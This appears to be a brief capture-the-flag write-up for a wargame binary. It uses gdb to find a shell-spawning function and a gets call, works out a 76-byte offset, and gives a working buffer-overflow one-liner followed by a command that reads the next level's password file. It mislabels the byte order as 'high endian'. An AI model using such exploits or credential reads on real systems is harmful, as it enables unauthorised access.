gdb ./level1

we use "info func" in gdb to see the list of functions in the binary
there is a function "run", it calls system("/usr/sh")

We also see that the main functions calls gets, without anything else.

We can use a buffer overflow attack to override the return pointer of the main function,
who will return to run

Find the adress of the function run:
(gdb) info func run
All functions matching regular expression "run":

Non-debugging symbols:
0x08048444  run

To find how many characters we need to write before overriding the return pointer
we lauch the binary in gdb and as input for gets we send
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvxxxxyyyyzzzz
The binary segfaults at adress 0x74747474, 0x74 in ascii is 't'

Our exploit string must then have 76 random chars then the adress of the run function, in high endian:

(python -c "print '.' * 76 + '\x44\x84\x04\x08'" && cat) | ./level1

As the first command closes the stdin of the binary,
the opened shell opened in "run" is immediately closed
if we don't open another one. This is done with the "&& cat" part of the line

We can then cat /home/user/level2/.pass to get the flag
